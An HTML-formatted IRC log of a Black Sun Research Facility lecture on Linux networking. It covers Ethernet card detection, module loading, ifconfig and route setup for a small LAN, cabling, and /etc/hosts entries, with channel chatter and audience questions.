@@ -1,0 +1,1095 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+      <title>Linux Networking</title>
+<style type=text/css>A:active {
+	TEXT-DECORATION: none
+}
+A:hover {
+	TEXT-DECORATION: underline
+}
+A:link {
+	TEXT-DECORATION: none
+}
+A:visited {
+	TEXT-DECORATION: none
+}
+</style>
+</head>
+<body text="#000000" bgcolor="#FFFFFF">
+
+<center><table BORDER=0 CELLSPACING=2 CELLPADDING=2 WIDTH="308" >
+<caption><TBODY>
+<br></TBODY></caption>
+
+<tr>
+<td>
+<pre><font color="#FF0000">.</font><font color="#000000">########</font><font color="#FF0000">...</font>######<font color="#FF0000">..</font>########<font color="#FF0000">..</font>########
+<font color="#FF0000">.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">.......</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......
+.</font>########<font color="#FF0000">...</font>######<font color="#FF0000">..</font>########<font color="#FF0000">..</font>######<font color="#FF0000">..
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.......</font>##<font color="#FF0000">.</font>##<font color="#FF0000">...</font>##<font color="#FF0000">...</font>##<font color="#FF0000">......
+.</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">....</font>##<font color="#FF0000">..</font>##<font color="#FF0000">......
+.</font>########<font color="#FF0000">...</font>######<font color="#FF0000">..</font>##<font color="#FF0000">.....</font>##<font color="#FF0000">.</font>##<font color="#FF0000">......</font></pre>
+</td>
+</tr>
+</table></center>
+
+<center><a href="http://blacksun.box.sk">http://blacksun.box.sk</a>
+<br>Lecturer: Ghost_Rider
+<br>Lecture: Linux Networking
+<br>Converter:&nbsp; <a href="mailto:aztek@box.sk">AZTEK</a></center>
+
+<p><br>
+<br>
+<br>
+<br>
+<p><font color="#FF0000">*** Mikkkeee sets mode: +m</font>
+<br><b>&lt;Ghost_Rider> ok..guys lecture time</b>
+<br><b>&lt;mikestevens></b> ok b0iler
+<br><font color="#FF0000">*** mikestevens sets mode: +o nin</font>
+<br><b>&lt;Ghost_Rider> the +m will be taken at the end of each topic</b>
+<br><font color="#FF0000">*** mikestevens sets mode: -o nin</font>
+<br><b>&lt;Ghost_Rider> so you can ask questions</b>
+<br><font color="#FF0000">*** mikestevens sets mode: +o Matt</font>
+<br><font color="#FF0000">*** Joins: [T]racer[T]</font>
+<br><font color="#FF0000">*** DigitalFallout sets mode: -m</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +m</font>
+<br><b>&lt;mikestevens></b> wrong person lol
+<br><b>&lt;Matt></b> use !mod and !unmod if you wish
+<br><font color="#FF0000">*** DigitalFallout sets mode: -m</font>
+<br><b>&lt;a|pha[away]></b> hehe
+<br><font color="#FF0000">*** Mikkkeee sets mode: +o Caboom</font>
+<br><b>&lt;[T]racer[T]></b> matt: waza dude
+<br><b>&lt;nin></b> !mod
+<br><b>&lt;Sapient2003></b> Does anybody know if Intel&reg; 2100 Pro/DSL
+Linux drivers exist?
+<br><b>&lt;a|pha[away]></b> too early
+<br><b>&lt;HardW1r3></b> its mute time
+<br><b>&lt;Mikkkeee></b> what we going to start?
+<br><font color="#FF0000">*** mikestevens sets mode: +v b0iler</font>
+<br><font color="#FF0000">* Ghost_Rider is waiting to make ppl decide...</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v bomb8595</font>
+<br><b>&lt;HardW1r3></b> i got 5:55 here
+<br><b>&lt;freeque></b> -m
+<br><b>&lt;freeque></b> if we all stfu
+<br><b>&lt;Mikkkeee></b> lets start
+<br><b>&lt;nin></b> +m
+<br><b>&lt;Matt></b> We've got another 8 mins or so?
+<br><b>&lt;Democow</b>> +m
+<br><b>&lt;freeque></b> 22:52:23 GMT
+<br><b>&lt;Dunceor></b> +m
+<br><b>&lt;a|pha[away]></b> neh, there will be idiots to speak when not
+necessary
+<br><b>&lt;a|pha[away]></b> 5 minutes
+<br><b>&lt;Mikkkeee></b> !mod
+<br><b>&lt;[T]racer[T]></b> kick the fuckerz!
+<br><b>&lt;Democow></b> !mod
+<br><b>&lt;[T]racer[T]></b> who speak not in the right place
+<br><b>&lt;[T]racer[T]></b> sqeez
+<br><b>&lt;b0iler></b> [T]racer[T]: like you?&nbsp; heh, heya msg me :)
+<br><b>&lt;darkvpx></b> will the people telling people not to speak please
+stop speaking
+<br><font color="#FF0000">*** Joins: ryph</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +m</font>
+<br><font color="#FF0000">*** darkvpx is now known as jimi</font>
+<br><font color="#FF0000">*** Joins: Sub</font>
+<br><font color="#FF0000">*** DigitalFallout changes topic to '''Welcome
+to Black Sun Research Facility, http://blacksun.box.sk | DON'T MESSAGE
+THE OPS WITHOUT PERMISSION FIRST! | NO warez/serials/cracks/clones/advertisements.&nbsp;
+LECTURE IN PROGRESS! SIT BACK AND RELAX'</font>
+<br><font color="#FF0000">*** Joins: Infini7y</font>
+<br><font color="#FF0000">*** Joins: Revocomms</font>
+<br><b>&lt;DigitalFallout></b> All set GR?
+<br><font color="#FF0000">*** Joins: rs</font>
+<br><b>&lt;DigitalFallout></b> All set GR?
+<br><b>&lt;Mikkkeee></b> k, should we voice everyone?
+<br><font color="#FF0000">*** mikestevens sets mode: +v Jahlin</font>
+<br><b>&lt;DigitalFallout></b> Sorry
+<br><b>&lt;Ghost_Rider> df: yeah</b>
+<br><b>&lt;Ghost_Rider> nope</b>
+<br><b>&lt;HardW1r3></b> no
+<br><b>&lt;mikestevens></b> not yet
+<br><b>&lt;Ghost_Rider> the +m</b>
+<br><b>&lt;Ghost_Rider> will be taken</b>
+<br><b>&lt;DigitalFallout></b> Then if we are all set
+<br><b>&lt;mikestevens></b> only the people we need
+<br><b>&lt;Ghost_Rider></b> at then end of each topic
+<br><b>&lt;DigitalFallout></b> LET THE PARTY BEGIN
+<br><b>&lt;DigitalFallout></b> &lt;START LECTURE LOGGING>
+<br><font color="#FF0000">* Mikkkeee says the room is all your rider</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +vvv a|pha[away] bobbie
+CodE4</font>
+<br><b>&lt;Ghost_Rider> thnx mike:)</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: -vvv a|pha[away] bobbie
+CodE4</font>
+<br><b>&lt;Ghost_Rider> well welcome ... as you know this is a networking
+lecture</b>
+<br><b>&lt;Ghost_Rider> I divided the lecture in 6 main topics</b>
+<br><b>&lt;Ghost_Rider> Ethernet card, LAN, IP masquerading, remote port
+fowarding, transparent proxy and NFS</b>
+<br><b>&lt;Ghost_Rider> at the end of each topic</b>
+<br><font color="#FF0000">*** Joins: blues</font>
+<br><b>&lt;Ghost_Rider> the +m will be taken</b>
+<br><b>&lt;Ghost_Rider> so you may ask anything related to it</b>
+<br><b>&lt;Ghost_Rider> also I advide you to download or at least check
+http://blacksun.box.sk/examples.txt</b>
+<br><font color="#FF0000">*** Joins: thebluegiant</font>
+<br><font color="#FF0000">*** Quits: thebluegiant (Quit: )</font>
+<br><b>&lt;Ghost_Rider> I'll use those ascii on the LAN part</b>
+<br><b>&lt;Ghost_Rider> now I think we are really ready to start</b>
+<br><b>&lt;mikestevens></b> after this I will follow up with a lecture
+on cable hacking
+<br><font color="#FF0000">*** Joins: _RooTs_</font>
+<br><b>&lt;Ghost_Rider> unless any oper or voice wanna say something</b>
+<br><b>&lt;HardW1r3></b> im ok
+<br><b>&lt;mikestevens></b> you can find the outline for my lecture at
+http://blacksun.box.sk/test/cablem.txt
+<br><b>&lt;Matt></b> Ghost_Rider, the notice
+<br><font color="#FF0000">*** Joins: Serial_Killer</font>
+<br><font color="#FF0000">*** rs is now known as RedShadow</font>
+<br><b>&lt;Ghost_Rider> Matt: yeah i saw it matt</b>
+<br><font color="#FF0000">*** SpiderMan sets mode: +o RedShadow</font>
+<br><b>&lt;Matt></b> Ghost_Rider, you could 'annouce it' :)
+<br><font color="#FF0000">*** Joins: Blue^demoN</font>
+<br><b>&lt;Matt></b> Its nice to see the old class btw
+<br><b>&lt;Ghost_Rider> ok ppl matt will be sorting questions</b>
+<br><font color="#FF0000">*** Joins: shady_harrasment_panda</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o shady_harrasment_panda</font>
+<br><font color="#FF0000">* DigitalFallout agrees with matt</font>
+<br><b>&lt;Ghost_Rider> and please guys don't start me asking prv questions</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v RedShadow</font>
+<br><font color="#FF0000">*** Joins: Ann0yeD</font>
+<br><b>&lt;Ghost_Rider> ok...ARE WE READY?</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: -o RedShadow</font>
+<br><b>&lt;shady_harrasment_panda></b> has it started
+<br><b>&lt;Mikkkeee></b> lets begin
+<br><b>&lt;Ghost_Rider> ok..</b>
+<br><font color="#FF0000">*** Joins: __052_-</font>
+<br><b>&lt;Ghost_Rider> start logging</b>
+<br><b>&lt;DigitalFallout></b> NEver stop :)
+<br><b>&lt;Ghost_Rider> Networking Lecture</b>
+<br><b>&lt;Ghost_Rider> 1st stop Ethernet Cards</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v VoidIndex</font>
+<br><font color="#FF0000">*** Parts: a|pha[away]</font>
+<br><font color="#FF0000">*** Joins: a|pha[away]</font>
+<br><b>&lt;Ghost_Rider> well there is not much to tell about this, I'll
+just guide you throught the detection, configuration and show you a start
+up script</b>
+<br><font color="#FF0000">*** [T]racer[T] is now known as TracerT</font>
+<br><b>&lt;Ghost_Rider> nowadays most of the ethernet cards are PCI based,
+still you can find some nice 10mbit/s ISA cards</b>
+<br><b>&lt;Ghost_Rider> I use ISA on my LAN@home..and I don't think I need
+more speed</b>
+<br><b>&lt;Ghost_Rider> but that's up to you</b>
+<br><font color="#FF0000">*** Quits: vatefairefoutre (Quit: )</font>
+<br><font color="#FF0000">*** Parts: Ann0yeD</font>
+<br><b>&lt;Ghost_Rider> now the 1st thing you gotta make sure is that the
+kernel is detecting ur hardware..(I never had problems but we never know)</b>
+<br><b>&lt;Ghost_Rider> so if you are using a ISA card you can use pnpdump</b>
+<br><b>&lt;Ghost_Rider> this will create a file that will be read by isapnp</b>
+<br><font color="#FF0000">*** Joins: Phish</font>
+<br><b>&lt;Ghost_Rider> what you gotta make sure is that the ethernet card
+is being detected..just go throught the dump and check for it</b>
+<br><b>&lt;Ghost_Rider> if otherwise it's pci you can cat /proc/pci and
+look for it</b>
+<br><font color="#FF0000">*** Joins: Leper</font>
+<br><b>&lt;Ghost_Rider> now what you have to find out is what kernel module
+will support ur card</b>
+<br><font color="#FF0000">*** Joins: zwanderer</font>
+<br><font color="#FF0000">*** Joins: Ann0yeD</font>
+<br><font color="#FF0000">*** Quits: Revocomms (Quit: Leaving)</font>
+<br><font color="#FF0000">*** Quits: Sapient2003 (Quit: )</font>
+<br><b>&lt;Ghost_Rider> most ISA cards work with NE2000 module (ne.o) and
+all the PCI cards I know (I just know a couple SMC cards) always</b>
+<br><b>&lt;Ghost_Rider> use the DECchip</b>
+<br><b>&lt;Ghost_Rider> you'll also have the module for it</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v zwanderer</font>
+<br><b>&lt;Ghost_Rider> thought if you have a EN2242</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Leper</font>
+<br><b>&lt;Ghost_Rider> common in laptops</b>
+<br><b>&lt;Ghost_Rider> you have to download a special version of DECchip
+module</b>
+<br><font color="#FF0000">*** Quits: Phish (Quit: [BX] Eat, drink and be
+merry...for tomorrow we die)</font>
+<br><b>&lt;zwanderer></b> sorry to interrupt, how far are we ?
+<br><font color="#FF0000">*** Joins: julon</font>
+<br><b>&lt;Ghost_Rider> zwanderer: just in the beginning</b>
+<br><b>&lt;zwanderer></b> ah cool
+<br><font color="#FF0000">*** Joins: paul_GG</font>
+<br><b>&lt;Ghost_Rider> but searching on google youll find that changed
+version</b>
+<br><font color="#FF0000">*** Quits: shady_harrasment_panda (Connection
+reset by peer)</font>
+<br><font color="#FF0000">*** Joins: Swirly</font>
+<br><b>&lt;Ghost_Rider> after loading the module using the command modprobe
+(/sbin/modprobe)</b>
+<br><font color="#FF0000">*** paul_GG is now known as shady_harrasment_panda</font>
+<br><b>&lt;Ghost_Rider> you'll start having a new interface that will be
+eth0</b>
+<br><b>&lt;Ghost_Rider> you can now nicelly /sbin/ifconfig eth0 to check
+it's status</b>
+<br><font color="#FF0000">*** Parts: Ann0yeD</font>
+<br><b>&lt;Ghost_Rider> you can make sure that ethernet card will be active
+doing /sbin/ifconfig eth0 up</b>
+<br><font color="#FF0000">*** Joins: Ellis_D</font>
+<br><font color="#FF0000">*** shady_harrasment_panda is now known as _shady_harrasment_panda-</font>
+<br><b>&lt;Ghost_Rider> for now you have the ethernet device working but
+you still can't comunicatte</b>
+<br><b>&lt;Ghost_Rider> with other computers</b>
+<br><font color="#FF0000">*** Joins: AxE</font>
+<br><font color="#FF0000">*** Quits: Crash_Gnome (Quit: we are the all
+dancing all singing crap of the world)</font>
+<br><b>&lt;Ghost_Rider> so for now our startup script would be something
+like ( it will be ended on the next section)</b>
+<br><b>&lt;Ghost_Rider> #!/bin/sh</b>
+<br><b>&lt;Ghost_Rider> /sbin/modprobe YOUR_ETHERNET_CARD_MODULE</b>
+<br><font color="#FF0000">*** AxE is now known as _AxE-</font>
+<br><b>&lt;Ghost_Rider> /sbin/ifconfig eth0 UP</b>
+<br><font color="#FF0000">*** Parts: Swirly</font>
+<br><b>&lt;Ghost_Rider> this might seem very basic for some of you..but
+I think I had to say it</b>
+<br><b>&lt;Ghost_Rider> Matt: do we have any questions for now?</b>
+<br><b>&lt;mikestevens></b> one thing
+<br><b>&lt;Ghost_Rider> yes mike:)</b>
+<br><b>&lt;mikestevens></b> you will have to make sure its in the right
+dir (the module)
+<br><b>&lt;Matt></b> Ghost_Rider, nope
+<br><b>&lt;mikestevens></b> and depmod before you modprobe
+<br><font color="#FF0000">*** Joins: mephist0</font>
+<br><b>&lt;Ghost_Rider> mikestevens: well depmode will take care of that</b>
+<br><b>&lt;Matt></b> If anyone has any question to ask GR, msg me and NOT
+him. GR is a VIP.
+<br><b>&lt;Ghost_Rider> lol</b>
+<br><b>&lt;Ghost_Rider> no matt i think i'll keep the way I thought</b>
+<br><b>&lt;Megram></b> GR also smells, but thats a different lecture...
+<br><b>&lt;Ghost_Rider> I'll take +m and ppl will make questions</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: -m</font>
+<br><b>&lt;Ghost_Rider> ok..so any questions?</b>
+<br><font color="#FF0000">*** Joins: vanished</font>
+<br><b>&lt;Ghost_Rider> or may I proceed?</b>
+<br><font color="#FF0000">*** Joins: Edrin</font>
+<br><b>&lt;Ghost_Rider> no?...good..continuing</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: +m</font>
+<br><font color="#FF0000">*** Matt sets mode: +v Edrin</font>
+<br><b>&lt;DigitalFallout></b> Is this lecture generic to all linux/unix
+systens?
+<br><b>&lt;Edrin></b> hi Matt
+<br><b>&lt;Ghost_Rider> df: mostly linux</b>
+<br><b>&lt;Mikkkeee></b> nice to see all the oldies here
+<br><b>&lt;DigitalFallout></b> Ok
+<br><font color="#FF0000">*** Quits: Blue^demoN (Ping timeout)</font>
+<br><b>&lt;Matt></b> Well, GR's doing such a generally good job, we can
+continue :)
+<br><font color="#FF0000">*** Quits: __052_- (Quit: Leaving)</font>
+<br><b>&lt;Ghost_Rider> so we know have working ethernet cards</b>
+<br><font color="#FF0000">*** Joins: i1der</font>
+<br><font color="#FF0000">*** Parts: _AxE-</font>
+<br><b>&lt;Ghost_Rider> it's time to setup LAN</b>
+<br><font color="#FF0000">*** Joins: Cyberwolf</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Cyberwolf</font>
+<br><b>&lt;Cyberwolf></b> hi all
+<br><font color="#FF0000">*** Joins: slakka</font>
+<br><b>&lt;Mikkkeee></b> damn cyber u missed the lecture
+<br><font color="#FF0000">*** Joins: Grim_Reaper</font>
+<br><b>&lt;Mikkkeee></b> just kidding
+<br><b>&lt;Cyberwolf></b> damn! its crowded in here :))
+<br><b>&lt;Ghost_Rider> let's check the 1st example of the example.txt
+(http://blacksun.box.sk/examples.txt)</b>
+<br><b>&lt;Ghost_Rider> I'll give you sometime to open the file...</b>
+<br><font color="#FF0000">*** Cyberwolf sets mode: +v Serial_Killer</font>
+<br><b>&lt;Ghost_Rider> ok..it's probably open</b>
+<br><b>&lt;Ghost_Rider> as you can see we have a direct ethernet-ethernet
+card connection..our LAN it's just 2 computers</b>
+<br><b>&lt;Ghost_Rider> this is the very easy to setup...but let's start
+from the beggining</b>
+<br><b>&lt;Ghost_Rider> since we are talking about private networks</b>
+<br><b>&lt;Ghost_Rider> we'll use the ips address that are use for private
+networks</b>
+<br><b>&lt;Ghost_Rider> they are 10.0.0.0/8</b>
+<br><b>&lt;Ghost_Rider> 172.16.0.0/32</b>
+<br><b>&lt;Ghost_Rider> 172.16.0.0/16 (sorry about this typo)</b>
+<br><b>&lt;Ghost_Rider> 192.168.0.0/24</b>
+<br><font color="#FF0000">*** Quits: PhAzE (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> now since we just got 2 computers (the router and
+the 2nd computer) we will use the Class C ip address</b>
+<br><font color="#FF0000">*** Quits: Megram (Connection reset by peer)</font>
+<br><b>&lt;Ghost_Rider> so we'll will put the router with ip address 192.168.0.1
+and the 2nd computer with ip 192.168.0.2</b>
+<br><font color="#FF0000">*** Quits: Jahlin (Quit: Leaving)</font>
+<br><b>&lt;Ghost_Rider> you might ask why don't we give .0 and .1 or as
+someone asked me before why can't we give the .255</b>
+<br><b>&lt;Ghost_Rider> well .0 and .255 and HOST ID can't be given because
+these too addies are special</b>
+<br><b>&lt;Ghost_Rider> the .0 represents the intire network..and .255
+is the broadcast address (When you wanna send something to every computer
+on the network)</b>
+<br><font color="#FF0000">*** Quits: zwanderer (Quit: Liberae sunt nostrae
+cogitationes)</font>
+<br><b>&lt;Ghost_Rider> so your HOST ID may be > 0 and &lt; 255 but never
+= to this 2 values</b>
+<br><font color="#FF0000">*** Joins: Megram</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o Megram</font>
+<br><b>&lt;Ghost_Rider> now that we have this clear (I think)</b>
+<br><b>&lt;Ghost_Rider> let's setup the ips for them</b>
+<br><b>&lt;mikestevens></b> actually you can use those, but you need to
+do some other stuff with netmasks
+<br><font color="#FF0000">*** Joins: Freezer</font>
+<br><b>&lt;mikestevens></b> they are special in most cases, so its better
+to leave them alone
+<br><font color="#FF0000">*** Megram sets mode: +v Freezer</font>
+<br><b>&lt;Ghost_Rider> now...we wanna set the following ips 192.168.0.1
+and 192.168.0.2</b>
+<br><font color="#FF0000">* Freezer prods megram,ghost,mikkkeee,caboom,wolf,spiderman
+and the rest in the tummy</font>
+<br><font color="#FF0000">*** Quits: VoidIndex (Quit: Shit on the Quit...)</font>
+<br><b>&lt;Ghost_Rider> we can do this using the /sbin/ifconfig</b>
+<br><b>&lt;Mikkkeee></b> hey freezer
+<br><b>&lt;Ghost_Rider> so as root on the router to give ip 192.168.0.1
+we'll do /sbin/ifconfig eth0 192.168.0.1 netmask 255.255.255.0</b>
+<br><font color="#FF0000">*** Joins: gUeSt51</font>
+<br><font color="#FF0000">*** Joins: hackbitbr</font>
+<br><b>&lt;Ghost_Rider> doing this should be add an entry to ur routing
+table</b>
+<br><b>&lt;Ghost_Rider> you can check it typing /sbin/route</b>
+<br><b>&lt;Ghost_Rider> and should be shown an entry besides loopback (127.0.0.1)</b>
+<br><font color="#FF0000">*** Joins: H2-0</font>
+<br><b>&lt;Ghost_Rider> TarcerT: eth0 it's the ethernet card inteface</b>
+<br><font color="#FF0000">*** hackbitbr is now known as CoRiNgA</font>
+<br><b>&lt;Ghost_Rider> but resuming</b>
+<br><b>&lt;Ghost_Rider> you now should have a route entry for 192.168.0.0
+that will have eth0 as interface</b>
+<br><font color="#FF0000">*** Quits: Dunceor (Quit: )</font>
+<br><b>&lt;Ghost_Rider> if this wan't added you have to add it by youself</b>
+<br><font color="#FF0000">*** Parts: i1der</font>
+<br><b>&lt;Ghost_Rider> to do this</b>
+<br><b>&lt;Ghost_Rider> you do /sbin/route add 192.168.0.0 netmask 255.255.255.0
+dev eth0</b>
+<br><font color="#FF0000">*** Quits: mephist0 (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> now you have a working ethernet card with ip and
+routing for other hosts on the same network</b>
+<br><b>&lt;Ghost_Rider> we repeat the process on the 2nd computer but giving
+the ip 192.168.0.2</b>
+<br><font color="#FF0000">*** Joins: WackC</font>
+<br><font color="#FF0000">*** Quits: b0iler (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> we connect both ethernet cards using a RJ-45 entriesand
+a crossover cable</b>
+<br><b>&lt;Ghost_Rider> remember to sue crossover cable when you are doing
+a ethernet to ethernet connection</b>
+<br><b>&lt;Ghost_Rider> sue = use</b>
+<br><font color="#FF0000">*** Joins: b0iler</font>
+<br><font color="#FF0000">*** Joins: zwanderer</font>
+<br><font color="#FF0000">*** Quits: _RooTs_ (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> it's now time to test our network</b>
+<br><font color="#FF0000">*** OperServ sets mode: +o zwanderer</font>
+<br><b>&lt;Megram></b> that is if you are connecting 2 nics directly btw...
+<br><b>&lt;Ghost_Rider> we just ping one box to the other</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v zwanderer</font>
+<br><b>&lt;zwanderer></b> Mikkkeee: nm ;)
+<br><b>&lt;Mikkkeee></b> heh
+<br><b>&lt;Ghost_Rider> Megram: yeah..I saied ethernet to ethernet connection</b>
+<br><b>&lt;Ghost_Rider> no ethernet --> hub/switch--> ethernet</b>
+<br><b>&lt;Ghost_Rider> not ethernet --> hub/switch--> ethernet</b>
+<br><b>&lt;Ghost_Rider> like I Was saying we now try to ping each host
+and if everything is ok we will receive reply</b>
+<br><font color="#FF0000">*** Quits: blues (Ping timeout)</font>
+<br><font color="#FF0000">*** Joins: Nightshade</font>
+<br><b>&lt;Ghost_Rider> if you are connecting more than 2 computers</b>
+<br><b>&lt;Ghost_Rider> we'll then have something like example 2</b>
+<br><font color="#FF0000">*** Joins: crankykid</font>
+<br><b>&lt;Ghost_Rider> we have the router connected to a HUB and some
+computers connected to the HUB, this can also be a switch</b>
+<br><b>&lt;Ghost_Rider> but for home networking a HUB is just fine</b>
+<br><font color="#FF0000">*** Parts: _shady_harrasment_panda-</font>
+<br><font color="#FF0000">*** Joins: Obzerver</font>
+<br><font color="#FF0000">*** Joins: shady_harrasment_panda</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o shady_harrasment_panda</font>
+<br><b>&lt;Ghost_Rider> in this situation you won't use crossover cable,
+but just what I think it's called RJ connectable cable (at least this is
+the pt translation)</b>
+<br><b>&lt;Ghost_Rider> Megram: those the cable has any specific name?</b>
+<br><b>&lt;Megram></b> you would use CAT3 or CAT5 patch cable
+<br><b>&lt;Ghost_Rider></b> ok..thnx for the name input:)
+<br><b>&lt;Megram></b> but yeah, a standard RJ45 cable would also be used
+to describe it
+<br><font color="#FF0000">*** Joins: SteeLe</font>
+<br><font color="#FF0000">*** ChanServ sets mode: +o SteeLe</font>
+<br><b>&lt;SteeLe></b> its a renuion :)
+<br><font color="#FF0000">*** Joins: muncheese</font>
+<br><font color="#FF0000">*** Quits: WackC (Connection reset by peer)</font>
+<br><b>&lt;Ghost_Rider> so right now you play with ur connection from one
+box to another</b>
+<br><font color="#FF0000">*** Joins: Apparatus</font>
+<br><b>&lt;Ghost_Rider> services like ftp, telnet ssh everything you can
+think</b>
+<br><b>&lt;Ghost_Rider> but for now JUST INSIDE UR NETWORK</b>
+<br><b>&lt;Ghost_Rider> now as you also know we like to give names to our
+boxes..like GhostBox or RunAwayBox or GhostLogger...well those are my boxes..lol</b>
+<br><font color="#FF0000">*** Quits: Democow (Ping timeout)</font>
+<br><font color="#FF0000">*** Joins: blues</font>
+<br><b>&lt;Ghost_Rider> still if you try from let's say box 1 telnet to
+box2name you won't make it</b>
+<br><font color="#FF0000">*** Mikkkeee sets mode: +v Apparatus</font>
+<br>&lt;Ghost_Rider> because box 1 doesn't know the which ip stands for
+that name (this is called alias)
+<br>&lt;Ghost_Rider> so what you have to do is editing a file at /etc/hosts
+and add an entry like
+<br>&lt;Ghost_Rider> 192.168.0.2 BOXNAME
+<br>&lt;Ghost_Rider> 192.168.0.2 antoehrname
+<br>&lt;Ghost_Rider> 192.168.0.3 antoehrname
+<br>&lt;Ghost_Rider> (sorry for the typo again)
+<br><b>&lt;mikestevens></b> just a general hint
+<br><b>&lt;Ghost_Rider> and if you want you can also name your network
+(network = 192.168.0.0)</b>
+<br><b>&lt;mikestevens></b> it is better to have the FQDN first
+<br><b>&lt;Ghost_Rider> edit /etc/networks</b>
+<br><b>&lt;Ghost_Rider> and add an entry 192.168.0.0 the name you want
+for the network</b>
+<br><b>&lt;Ghost_Rider> mikestevens: wanna add something?</b>
+<br><b>&lt;mikestevens></b> 24.7.219.28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+unixclan.box.sk unixclan
+<br><b>&lt;mikestevens></b> that is a good example
+<br><b>&lt;mikestevens></b> alot of networking software likes the FQDN
+first
+<br><b>&lt;mikestevens></b> you can make up a domain name if you like
+<br><b>&lt;mikestevens></b> and use it internally
+<br><b>&lt;Ghost_Rider> but mike..u have see that we are working inside
+an LAN...</b>
+<br><b>&lt;Ghost_Rider> well but ok..we can do like BOX.localdomain BOX</b>
+<br><b>&lt;mikestevens></b> yes
+<br><b>&lt;Ghost_Rider> and well have FQDN 1st</b>
+<br><b>&lt;mikestevens></b> yes, that is what is best
+<br><b>&lt;Ghost_Rider> but even not putting it it will work (at least
+everything works on my lan)</b>
+<br><b>&lt;mikestevens></b> I've had barfing problems with that
+<br><b>&lt;Ghost_Rider> ok...</b>
+<br><font color="#FF0000">*** Ghost_Rider sets mode: -m</font>
+<br><b>&lt;freeque></b> does all this apply for a wireless network? other
+than the cables section of course :-)
+<br><b>&lt;mikestevens></b> ok
+<br><b>&lt;Megram></b> essentially
+<br><b>&lt;mikestevens></b> this has come up
+<br><b>&lt;mikestevens></b> FQDN stands for Fully Qualified Domain Name
+<br><b>&lt;mikestevens></b> its the diffrence between www and www.foo.com
+<br><font color="#FF0000">*** Quits: blues (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> freeque: if the network is TCP/ip based yes</b>
+<br><b>&lt;mikestevens></b> www is the hostname
+<br><b>&lt;mikestevens></b> www.foo.com is the FQDN
+<br><b>&lt;jaxler></b> proceed
+<br><b>&lt;Ghost_Rider> any more questions?</b>
+<br><b>&lt;Megram></b> freeque, you will probably need a different module
+to the ones GR suggested, but they shouldnt be too hard to find
+<br><b>&lt;DigitalFallout></b> Ghost_Rider: are you god?
+<br><b>&lt;freeque></b> lol
+<br><font color="#FF0000">*** Joins: Kintege</font>
+<br><b>&lt;mikestevens></b> yes he is
+<br><b>&lt;Cyberwolf></b> is a crossover cable very different from a regular
+UTP cable?
+<br><b>&lt;DigitalFallout></b> Hehehe
+<br><b>&lt;Ghost_Rider></b> freeque: check the IrDA kernel modules
+<br><b>&lt;Megram></b> Cyberwolf, ish
+<br><b>&lt;mikestevens></b> Cyberwolf: Crossover is a diffrent Pin setting
+<br><b>&lt;TracerT></b> wait
+<br><b>&lt;freeque></b> Ghost_Rider - cheers. u know too much m8 ;-)
+<br><b>&lt;Megram></b> Cyberwolf, it simply has 1 pair of the wires crossed
+over
+<br><font color="#FF0000">*** Joins: norton</font>
+<br><b>&lt;mikestevens></b> UTP stands for Unshielded Twisted Pair
+<br><b>&lt;Cyberwolf></b> k, thanx guys
+<br><b>&lt;jimi></b> what is the bnc port of my hub used for?
+<br><b>&lt;TracerT></b> how the RJ45 cabel loox like?
+<br><b>&lt;mikestevens></b> STP is shielded Twisted Pair
+<br><b>&lt;mikestevens></b> (not the band)
+<br><b>&lt;Ghost_Rider> TracerT: a normal cable</b>
+<br><b>&lt;Cyberwolf></b> TracerT: like a phone/ISDN plug
+<br><b>&lt;Ghost_Rider> TracerT: with 4 wires in it</b>
+<br><b>&lt;Ghost_Rider> hehe</b>
+<br><b>&lt;Megram></b> jimi, the bnc part is for using bnc/thinnet cabling.
+that requires different cabling methods, and i suggest using cat3/5 over
+bnc
+<br><font color="#FF0000">*** Freezer is now known as ]|MooCow|[</font>
+<br><b>&lt;jimi></b> oh ok thanks
+<br><b>&lt;mikestevens></b> Cat 5 can do 100Mbit :-)
+<br><b>&lt;Ghost_Rider> unless you guys wanna use AUI on ur network:)</b>
+<br><b>&lt;a|pha[away]></b> 2 pari cable
+<br><b>&lt;ShellFish></b> i have q.. realy lame but what does the "cat
+x" stand for?
+<br><font color="#FF0000">*** Joins: codz</font>
+<br><b>&lt;a|pha[away]></b> pair
+<br><b>&lt;Megram></b> shell, ok....
+<br><b>&lt;Megram></b> shellfish, its just used for declaring the capabilities
+of the cable. cat 3 is 'category 3', capable of 10mps connections, and
+prone to interference
+<br><font color="#FF0000">*** Quits: RedShadow (Quit: gtg, bbl)</font>
+<br><font color="#FF0000">*** Quits: TracerT (Connection reset by peer)</font>
